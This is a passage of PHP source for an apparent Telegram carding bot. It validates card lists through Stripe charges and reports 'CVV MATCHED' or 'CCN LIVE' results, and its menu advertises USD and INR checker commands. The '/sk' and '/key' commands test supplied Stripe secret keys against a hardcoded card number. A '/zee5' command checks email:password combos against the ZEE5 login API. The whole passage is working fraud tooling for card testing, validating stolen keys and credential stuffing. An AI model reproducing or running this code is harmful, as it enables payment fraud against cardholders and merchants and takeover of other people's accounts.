                elseif(strpos($result2,'"cvc_check": "pass"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Payment Cannot Be Completed</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif(strpos($result2,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CCN LIVE β β </b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  CVV MISSMATCH</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif(strpos($result1,'"code": "incorrect_cvc"')){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CCN LIVE β β </b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  CVV MISSMATCH</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  γ β CVV MATCHED β β γ</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Transaction Not Allowed</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt</b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Fraudulent</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Expired πΎππ§π</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, "generic_declined")) || (strpos($result2, "generic_declined"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Generic Declined</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
                }
                elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Do Not Honor</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  SK IS AT RATE LIMIT</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                
                elseif ((strpos($result1, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  Generic Declined</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
                sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£ πΎππ§π β£  <code>$lista</code></b>%0A<b>ββ£ ππ©ππ©πͺπ¨ β£  πΎππ§π Number Is Incorrect</b>%0A<b>ββ£ πππ¨π₯π€π£π¨π β£  Declined β</b>%0A<b>ββ£ ππ?ππ²ππ?π β£  Stripe Charge βΉ$amt </b>%0Aβββββββββ πππ ππππ ββββββββ%0A<b><b>ββ£ ππ?π»πΈ β£</b> $bank %0A<b>ββ£ ππΌππ»ππΏπ β£</b> $name $emoji %0A<b>ββ£ ππΏπ?π»π± β£</b> $brand %0A<b>ββ£ πΎππ§π β£ </b> $scheme%0A<b>ββ£ π§ππ½π² β£</b> $type </b>%0A<b>ββ£ ππππ πππππ β£</b> <b>$time s</b>%0Aββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @$usernam%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);}
                else {
                sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
                };
                }
        
        elseif ((strpos($message, "/cmds") === 0)||(strpos($message, "!cmds") === 0)||(strpos($message, "!command") === 0)||(strpos($message, "!commands") === 0)||(strpos($message, "/commands") === 0)||(strpos($message, "/command") === 0)||(strpos($message, "/cmd") === 0)){
        sendMessage($chatId, "<b>π½ππΌ π²π² π²π·πΊ%0A%0Aγ β πππππ β γ%0D%0Aβββββββββββββββββββββββββββ%0Aββ£ππ­π«π’π©π ππ‘ππ«π π <b>$1</b> β£ /usd or /chk %0Aββ£ ππ©ππ©πͺπ¨ β£ OFFβ%0Aββββββββββββββββββββ%0Aββ£ππ­π«π’π©π ππ‘ππ«π π <b>$5</b> β£ /chk5%0Aββ£ππ©ππ©πͺπ¨ β£ OFFβ%0Aββββββββββββββββββββ %0Aββ£ππ­π«π’π©π ππ‘ππ«π π βΉπππ β£ /inr %0Aββ£ππ©ππ©πͺπ¨ β£ ONβ%0Aββββββββββββββββββββ%0Aββ£ππ­π«π’π©π ππ‘ππ«π π βΉππ β£ /inr45 %0Aββ£ππ©ππ©πͺπ¨ β£ ONβ%0Aββββββββββββββββββββ%0Aββ£πππ ππππππ β£ /bin %0Aββ£ππ©ππ©πͺπ¨ β£ ONβ%0Aββββββββββββββββββββ %0Aββ£ππ πππππ β£ /sk %0Aββ£ππ©ππ©πͺπ¨ β£ ONβ%0Aββββββββββββββββββββ%0Aββ£Free Accessγπ½ππΌγ@NTMchat%0Aββββββββββββββββββββ%0Aββ£ππ¨π­ ππ² @abdul97233%0Aββββββββββββββββββββ %0Aββ£ππ¨ π€π§π¨π° π²π¨π?π« π’π β£ /id%0Aβββββββββββββββββββββββββββ</b>", $message_id);
        }
        
        //////////=========[Bin Command]=========//////////
        
        elseif ((strpos($message, "/bin") === 0)||(strpos($message, "!bin") === 0)||(strpos($message, ".bin") === 0)){
        $bin = substr($message, 5);
        if (!empty($bin)) {
        $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $info = curl_getinfo($ch);
        $time = $info['total_time'];
        $httpCode = $info['http_code'];
         $time = substr($time, 0, 4);
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        sendMessage($chatId, '<b>%0Aββββββββββββββββββββ%0Aββ£γ β VALID BIN β β γ</b>%0A<b>ββ£ ππ?π»πΈβ£ </b> '.$bank.'%0A<b>ββ£ ππΌππ»ππΏπ β£ </b> '.$name.''.$emoji.'%0A<b>ββ£ ππΏπ?π»π± β£</b> '.$brand.'%0A<b>ββ£ πΎππ§π β£ </b> '.$scheme.'%0A<b>ββ£ π§ππ½π² β£ </b> '.$type.'%0A<b>ββ£ ππππ πππππ β£</b> <b>'.$time.' s</b>ββββββββββββββββββββ%0A<b>ββ£ ππ΅π²π°πΈπ²π± ππ β£ </b> @'.$username.'%0A<b>ββ£ ππΌπ ππ β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>', $message_id);
        }
else {
sendMessage($chatId, '<b>β Invalid Bin%0AFormat - /bin xxxxxx</b>', $message_id);
}
}
elseif (strpos($message, "/key") === 0){
$sec = substr($message, 5);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aββ£γ β LIVE πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$skhidden</code>%0A<u>ββ£ ππππππππ β£</u> ππ ππππ!!%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππππππ πππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> ππ¨ πK πππ² ππ«π¨π―π’πππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β οΈ β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππ­π ππ’π¦π’π­ππ πππ²%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππ¬π­π¦π¨ππ ππ‘ππ«π ππ¬ ππ§π₯π²%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> ππ©π’ πππ² ππ±π©π’π«ππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
else{
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$skhidden</code>%0A<u>ββ£ ππππππππ β£</u> Unknown Error.%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππ¨ ππ€ ππ«π¨π―π’πππ β β γ%0AFormat - /key sk_live_xxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}
elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
if (!empty($sec)) {
$skhidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
$result = curl_exec($ch);
$response = trim(strip_tags(GetStr($result,'"message": "','"')));
if (strpos($result, 'tok_')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β LIVE πππ β β γβ LIVE πππ</b>%0A<u>ββ£ πππ β£</u> <code>$skhidden</code>%0A<u>ββ£ ππππππππ β£</u> ππ ππππ!!%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γβ ππππ πππ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππππππ πππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'You did not provide an API key.')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> ππ¨ πK πππ² ππ«π¨π―π’πππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'rate_limit')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β οΈ β γ </b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππ­π ππ’π¦π’π­ππ πππ²%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> πππ¬π­π¦π¨ππ ππ‘ππ«π ππ¬ ππ§π₯π²%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
elseif (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ</b>%0A<u>ββ£ πππ β£</u> <code>$sec</code>%0A<u>ββ£ ππππππππ β£</u> ππ©π’ πππ² ππ±π©π’π«ππ%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
else{
sendMessage($chatId, "<b>%0Aβββββββββββββββββββββββββββ%0Aβγ β ππππ πππ β β γ </b>%0A<u>ββ£ πππ β£</u> <code>$skhidden</code>%0A<u>ββ£ ππππππππ β£</u> Unknown Error.%0A<u>ββ£ ππ‘πππ€ππ ππ² β£ </u> @$usernam%0A<b>ββ£ ππ¨π­ ππ² β£γπ½ππΌγ@NTMchat</b>%0A<b>βββββββββββββββββββββββββββ</b>", $message_id);
}
}
else {
sendMessage($chatId, '<b>%0Aββββββββββββββββββββ%0Aβγ β ππ¨ ππ€ ππ«π¨π―π’πππ β β γ%0AFormat - /sk sk_live_xxxxxxxxxxx</b>', $message_id);
}
delMessage($chatId, $message_id);
;}

//////////=========[Zee5 Command]=========//////////

elseif (strpos($message, "/zee5") === 0){
$combo = substr($message, 6);
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Asia/Kolkata');
$date1 = date('yy-m-d');
function multiexplode($delimiters, $string){
$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;
};
$email = multiexplode(array(":", "|", ""), $combo)[0];
$pass = multiexplode(array(":", "|", ""), $combo)[1];
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
    
///////////////////////===========[Login Check]============/////////////////////
    
$resultmann = file_get_contents('https://userapi.zee5.com/v1/user/loginemail?email='.$email.'&password='.$pass.'');
$token = trim(strip_tags(GetStr($resultmann,'{"token":"','"}')));
    
/////////////////===============[Result]===========///////////////////
    
if($token){
sendMessage($chatId, "<b>ZEE5 Account-Β»</b>%0A<b>βCombo-Β»</b> <code>$combo</code>%0A<b>βResponse-Β»</b> <b>Successfully Logged in</b>%0A<b>βChecked By-Β»</b> @$username%0A%0A<b>βBot by --Β»γπ½ππΌγ%0A @abdul97233 </b>", $message_id);
}else{
sendMessage($chatId, "<b>βCombo-Β»</b> <code>$combo</code>%0A<b>βResponse-Β»</b> <b>Wrong Email or Password</b>%0A<b>βChecked By-Β»</b> @$username%0A%0A<b>βBot by --Β»γπ½ππΌγ%0A @abdul97233 </b>", $message_id);
};
curl_close($ch);
ob_flush();
}
   
////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};
function delMessage ($chatId, $message_id){
$url = $GLOBALS[website]."/deleteMessage?chat_id=".$chatId."&message_id=".$message_id."";
file_get_contents($url);
};

function editMessage($chatId, $message, $messageId) {

$url = $GLOBALS[website]."/editMessageText?chat_id=".$chatId."&message_id=".$messageId."&text=".urlencode($message);
file_get_contents($url);

}
?>
